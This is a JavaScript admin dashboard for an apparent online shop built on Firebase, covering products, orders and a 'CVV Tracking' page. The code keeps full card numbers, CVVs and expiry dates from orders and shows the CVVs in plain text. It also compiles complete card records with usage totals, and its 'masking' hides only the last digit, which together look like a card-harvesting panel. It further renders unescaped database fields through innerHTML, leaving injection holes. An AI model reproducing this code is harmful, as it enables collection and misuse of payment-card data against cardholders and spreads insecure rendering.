// ============================================
// ADMIN DASHBOARD JAVASCRIPT - WORKING VERSION
// ============================================

// Global variables
let currentUser = null;

// Check authentication
auth.onAuthStateChanged(async (user) => {
    if (!user) {
        window.location.href = 'index.html';
        return;
    }
    
    currentUser = user;
    
    // Check if admin
    const userDoc = await db.collection('users').doc(user.uid).get();
    if (!userDoc.exists || userDoc.data().role !== 'admin') {
        alert('Access Denied: Admin only');
        window.location.href = 'index.html';
        return;
    }
    
    // Set admin name
    document.getElementById('adminName').textContent = user.displayName || 'Admin';
    
    // Load all data
    loadDashboardStats();
    loadProducts();
    loadOrders();
    loadCVVTracking();
});

// ============================================
// NAVIGATION FUNCTIONS
// ============================================

function showDashboard() {
    // Hide all sections
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('dashboard').classList.add('active');
    
    // Update sidebar active state
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.getElementById('menuDashboard').classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Dashboard';
}

function showProducts() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('products').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.getElementById('menuProducts').classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Products';
    loadProducts();
}

function showAddProduct() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('add-product').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.getElementById('menuAddProduct').classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Add Product';
}

function showOrders() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('orders').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.getElementById('menuOrders').classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Orders';
    loadOrders();
}

function showCVVTracking() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('cvv-tracking').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.getElementById('menuCVV').classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'CVV Tracking';
    loadCVVTracking();
}

// ============================================
// MASK CARD FUNCTION (Last Digit Hide)
// ============================================

function maskCardNumber(cardNumber) {
    if (!cardNumber) return 'N/A';
    const clean = cardNumber.replace(/\s/g, '');
    if (clean.length >= 16) {
        const first15 = clean.slice(0, 15);
        const formatted = first15.match(/.{1,4}/g)?.join(' ') || first15;
        return formatted + '*';
    }
    return cardNumber;
}

// ============================================
// LOAD DASHBOARD STATS
// ============================================

async function loadDashboardStats() {
    try {
        const ordersSnapshot = await db.collection('orders').get();
        document.getElementById('totalOrders').textContent = ordersSnapshot.size;
        
        let revenue = 0;
        ordersSnapshot.forEach(doc => {
            revenue += doc.data().totalAmount || 0;
        });
        document.getElementById('totalRevenue').textContent = '$' + revenue.toLocaleString();
        
        const productsSnapshot = await db.collection('products').get();
        document.getElementById('totalProducts').textContent = productsSnapshot.size;
        
    } catch (error) {
        console.error('Error loading stats:', error);
    }
}

// ============================================
// LOAD PRODUCTS
// ============================================

async function loadProducts() {
    try {
        const snapshot = await db.collection('products').get();
        const tbody = document.getElementById('productsBody');
        tbody.innerHTML = '';
        
        if (snapshot.empty) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No products found</td></tr>';
            return;
        }
        
        snapshot.forEach(doc => {
            const product = doc.data();
            tbody.innerHTML += `
                <tr>
                    <td><img src="${product.imageUrl || 'https://placehold.co/50'}" class="product-image"></td>
                    <td>${product.name || ''}</td>
                    <td>$${product.price || 0}</td>
                    <td>${product.category || ''}</td>
                    <td>${product.stock || 0}</td>
                    <td><button class="btn-delete" onclick="deleteProduct('${doc.id}')">Delete</button></td>
                </tr>
            `;
        });
    } catch (error) {
        console.error('Error loading products:', error);
    }
}

// ============================================
// ADD PRODUCT
// ============================================

document.getElementById('productForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    try {
        const productData = {
            name: document.getElementById('productName').value,
            price: parseFloat(document.getElementById('productPrice').value),
            category: document.getElementById('productCategory').value,
            description: document.getElementById('productDescription').value,
            stock: parseInt(document.getElementById('productStock').value),
            imageUrl: document.getElementById('productImageUrl').value,
            createdAt: new Date().toISOString()
        };
        
        await db.collection('products').add(productData);
        alert('✅ Product added!');
        document.getElementById('productForm').reset();
        showProducts();
        
    } catch (error) {
        alert('Error: ' + error.message);
    }
});

// ============================================
// DELETE PRODUCT
// ============================================

async function deleteProduct(productId) {
    if (confirm('Delete this product?')) {
        await db.collection('products').doc(productId).delete();
        loadProducts();
        loadDashboardStats();
    }
}

// ============================================
// LOAD ORDERS
// ============================================

async function loadOrders() {
    try {
        const snapshot = await db.collection('orders').orderBy('createdAt', 'desc').get();
        const tbody = document.getElementById('ordersBody');
        tbody.innerHTML = '';
        
        if (snapshot.empty) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center;">No orders found</td></tr>';
            return;
        }
        
        snapshot.forEach(doc => {
            const order = doc.data();
            const card = order.cardDetails || {};
            const maskedCard = maskCardNumber(card.cardNumber);
            
            tbody.innerHTML += `
                <tr>
                    <td>#${doc.id.slice(-8)}</td>
                    <td>${order.userEmail || 'N/A'}</td>
                    <td>$${order.totalAmount}</td>
                    <td class="card-number">${maskedCard}</td>
                    <td>${card.cvv || 'N/A'}</td>
                    <td>${card.expiry || 'N/A'}</td>
                    <td>${new Date(order.createdAt).toLocaleDateString()}</td>
                </tr>
            `;
        });
    } catch (error) {
        console.error('Error loading orders:', error);
    }
}

// ============================================
// LOAD CVV TRACKING
// ============================================

async function loadCVVTracking() {
    try {
        const ordersSnapshot = await db.collection('orders').get();
        const cvvStats = {};
        
        ordersSnapshot.forEach(doc => {
            const order = doc.data();
            const card = order.cardDetails || {};
            const cvv = card.cvv;
            const cardNumber = card.cardNumber;
            const expiry = card.expiry || 'N/A';
            
            if (cvv && cardNumber) {
                const key = `${cvv}_${cardNumber}_${expiry}`;
                
                if (!cvvStats[key]) {
                    cvvStats[key] = {
                        cvv: cvv,
                        cardNumber: cardNumber,
                        expiry: expiry,
                        totalOrders: 0,
                        totalAmount: 0,
                        lastUsed: order.createdAt
                    };
                }
                
                cvvStats[key].totalOrders++;
                cvvStats[key].totalAmount += order.totalAmount || 0;
                
                if (order.createdAt > cvvStats[key].lastUsed) {
                    cvvStats[key].lastUsed = order.createdAt;
                }
            }
        });
        
        const tbody = document.getElementById('cvvBody');
        tbody.innerHTML = '';
        
        if (Object.keys(cvvStats).length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;">No data found</td></tr>';
            return;
        }
        
        Object.values(cvvStats).forEach(stat => {
            const maskedCard = maskCardNumber(stat.cardNumber);
            
            tbody.innerHTML += `
                <tr>
                    <td><strong>${stat.cvv}</strong></td>
                    <td class="card-number">${maskedCard}</td>
                    <td>${stat.expiry}</td>
                    <td>${stat.totalOrders}</td>
                    <td>$${stat.totalAmount.toLocaleString()}</td>
                    <td>${new Date(stat.lastUsed).toLocaleString()}</td>
                </tr>
            `;
        });
        
    } catch (error) {
        console.error('Error loading CVV tracking:', error);
    }
}

// ============================================
// LOGOUT
// ============================================

function logout() {
    auth.signOut().then(() => {
        window.location.href = 'index.html';
    });
        }
